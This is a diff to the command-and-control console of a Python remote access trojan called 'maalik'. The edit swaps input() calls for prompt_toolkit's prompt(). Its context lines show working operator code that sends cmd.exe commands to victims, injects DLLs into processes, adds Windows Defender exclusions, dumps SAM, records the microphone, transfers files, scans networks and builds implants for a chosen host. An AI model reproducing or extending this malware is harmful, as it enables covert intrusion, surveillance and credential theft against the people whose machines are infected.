@@ -12,6 +12,7 @@ import subprocess
 import sys
 import random
 from .builder import Build
+from prompt_toolkit import prompt
 
 clients = [] # A List for client sockets
 hostList = [] # A list for Client userpcs
@@ -153,7 +154,7 @@ class ClientManage:
                 print("[*] Press CTRL+C when Done.")
                 while(True):
                     try:
-                        input("")
+                        prompt("")
                     except KeyboardInterrupt:
                         
                         self.SendData("cmd.exe /c netsh interface portproxy reset")
@@ -163,8 +164,8 @@ class ClientManage:
 
         def filetransfer(mfile = None, rfile=None):
             if(mfile == None and rfile == None):
-                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
-                rfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
+                mfile = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
+                rfile = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
                 
             if(":" in rfile):
                     print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
@@ -189,8 +190,8 @@ class ClientManage:
         
         def DLLTransfer(mfile=None, proc=None):
             if(mfile == None and proc == None):
-                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
-                proc = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process Name : ")
+                mfile = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
+                proc = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process Name : ")
             try:
                 with open(mfile, "rb") as sendfile:
                     data = sendfile.read()
@@ -237,7 +238,7 @@ class ClientManage:
                     session = False
                     break
                 ip = iplist[location]
-                main = input(Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Fore.LIGHTCYAN_EX +  "({ip}) : ".format(ip = ip) + Style.RESET_ALL)
+                main = prompt(Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Fore.LIGHTCYAN_EX +  "({ip}) : ".format(ip = ip) + Style.RESET_ALL)
                 if(main == "ls"):
                     
                     self.SendData("listdir")
@@ -255,14 +256,14 @@ class ClientManage:
                     except IndexError:
                         print(Style.BRIGHT + Fore.RED + "[X] Error : Usage is cd < dir > ")
                 elif(main == "execute"):
-                    filename = input("[:] Enter Filename to Execute : ")
+                    filename = prompt("[:] Enter Filename to Execute : ")
                     if(len(filename) > 0):
                         self.SendData("exec")
                         self.SendData(filename)
                  
                 elif(main == "execargs"):
-                    filename = input("[:] Enter Filename to Execute : ")
-                    args = input("[:] Command line arguments : ")
+                    filename = prompt("[:] Enter Filename to Execute : ")
+                    args = prompt("[:] Command line arguments : ")
                     if(len(filename) > 0 and len(args) > 0):
                         self.SendData("execargs:"+filename+":"+args)
                         self.WaitForReply()
@@ -270,7 +271,7 @@ class ClientManage:
                     shell = True
                     
                     while (shell):
-                        sh = input(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
+                        sh = prompt(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
                         if(len(sh) > 0):
                             if(sh != "exit"):
                                 self.SendData("cmd.exe /c "+ sh)
@@ -286,7 +287,7 @@ class ClientManage:
                     break
 
                 elif(main == "delete"):
-                    dlt = input("[:] Enter Filename to Delete : ")
+                    dlt = prompt("[:] Enter Filename to Delete : ")
                     if(len(dlt) > 0):
                         self.SendData("delete:"+dlt)
                         self.WaitForReply()
@@ -323,7 +324,7 @@ class ClientManage:
                     if(len(self.attack_host) > 0):
                         ip = self.attack_host[0]
                     else:
-                        ip = input("[+] Enter IP : ")
+                        ip = prompt("[+] Enter IP : ")
                     if(len(ip) > 0):
                         silent = True
                         while(True):
@@ -348,7 +349,7 @@ class ClientManage:
                     self.SendData("cmd.exe /c netsh wlan show all")
                     self.WaitForReply()
                 elif ( main == "windefender_exclude"):
-                    path = input("[+] Path on Remote PC ( File / Folder ) : ")
+                    path = prompt("[+] Path on Remote PC ( File / Folder ) : ")
                     if(len(path) > 0):
                         self.SendData("exclude")
                         self.SendData(path)
@@ -380,9 +381,9 @@ class ClientManage:
                     
                 elif ( main == "portfwd"):
                     cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}"
-                    listen_port = input("[+] Enter Port to Listen for Connection : ")
-                    connect_addr = input("[+] Enter Host to Forward Connection to : ")
-                    connect_port = input("[+] Enter Port to Forward Connection to : ")
+                    listen_port = prompt("[+] Enter Port to Listen for Connection : ")
+                    connect_addr = prompt("[+] Enter Host to Forward Connection to : ")
+                    connect_port = prompt("[+] Enter Port to Forward Connection to : ")
                     newstr = cmdstr.format(lp = listen_port, cp = connect_port, ca = connect_addr)
                     print(newstr)
                     
@@ -395,7 +396,7 @@ class ClientManage:
                     self.WaitForReply()
                 elif( main == "network_scan"):
                     try:
-                        iprange = input("[" + Style.BRIGHT +  Fore.LIGHTYELLOW_EX + "^" + Style.RESET_ALL + "] Enter Range (eg: 192.168.0.1/24) : ")
+                        iprange = prompt("[" + Style.BRIGHT +  Fore.LIGHTYELLOW_EX + "^" + Style.RESET_ALL + "] Enter Range (eg: 192.168.0.1/24) : ")
                         scanRange = iprange.split("/")
                         start = scanRange[0]
                         get = start.split(".")
@@ -426,12 +427,12 @@ class ClientManage:
                         print("[" + Style.BRIGHT + Fore.RED + "x" + Style.RESET_ALL + "] Error : No Hosts scanned.")
                         
                 elif(main == "clear_hosts"):
-                    confirm = input("[X] Confirm Clear hosts? You will need to Rescan! (y/n) : ")
+                    confirm = prompt("[X] Confirm Clear hosts? You will need to Rescan! (y/n) : ")
                     if(confirm.lower() == "y"):
                         del self.remote_hosts_list[:]
 
                 elif ( main == "clear_ports"):
-                    confirm = input("[X] Confirm Clear Ports? You will need to Rescan! (y/n) : ")
+                    confirm = prompt("[X] Confirm Clear Ports? You will need to Rescan! (y/n) : ")
                     if(confirm.lower() == "y"):
                         del self.open_ports_list[:]
                 
@@ -582,7 +583,7 @@ Open Ports
                     
 
                 elif(main == "taskkill"):
-                    processname = input("[?] Enter Process name : ")
+                    processname = prompt("[?] Enter Process name : ")
                     if(len(processname) > 0):
                         
                         self.SendData("cmd.exe /c taskkill /IM " + processname + " /F")
@@ -600,7 +601,7 @@ Open Ports
                 
                 elif(main == "host_sweep -h"):
                     try:
-                        ip = input("[?] Enter IP : ")
+                        ip = prompt("[?] Enter IP : ")
                         if(len(ip) > 0):
                             self.SendData("gethostname")
                             self.SendData(ip)
@@ -614,14 +615,14 @@ Open Ports
                     time.sleep(2)
 
                 elif(main == "download"):
-                    filename = input("[+] File : ")
+                    filename = prompt("[+] File : ")
                     if(len(filename) > 0):
                         self.SendData("fupload:"+filename)
                         self.WaitForReply()
                         time.sleep(5)
 
                 elif(main == "psinfo"):
-                    name = input("[+] Enter Process name : ")
+                    name = prompt("[+] Enter Process name : ")
                     if(len(name) > 0):
                         self.SendData("psinfo:"+name)
                         self.WaitForReply()
@@ -666,10 +667,10 @@ Open Ports
                         print("[+] Error dumping sam.")
                 
                 elif(main == "capturemic"):
-                    seconds = input("[?] Recording time in seconds : ")
+                    seconds = prompt("[?] Recording time in seconds : ")
                     SendPayloadCommand(seconds)
                     DLLTransfer("payloads/capturemic.dll",setting('inject_process'))
-                    print("[+] Recording microphone input ...")
+                    print("[+] Recording microphone prompt ...")
                     time.sleep(int(seconds)+ 2)
                     self.SendData("fupload:"+ hostList[location].split("/")[1].strip() + ".wav")
                     self.WaitForReply()
@@ -1076,8 +1077,8 @@ def Console():
     while(True):
         try:
             if(silent == False):
-                inputstr = Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Style.RESET_ALL + Style.BRIGHT
-                x = input(inputstr)
+                promptstr = Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Style.RESET_ALL + Style.BRIGHT
+                x = prompt(promptstr)
                 args = x.split()
                 if(x == "list" or x == "sessions"):
                     list_bots()
@@ -1112,8 +1113,8 @@ def Console():
                         """
                         + Style.RESET_ALL)
                 elif(x == "build"):
-                    host = input("[+] Host : ")
-                    port = input("[+] Port : ")
+                    host = prompt("[+] Host : ")
+                    port = prompt("[+] Port : ")
                     if(len(host) > 0 and len(port) > 0):
                         Build(host, port)
 
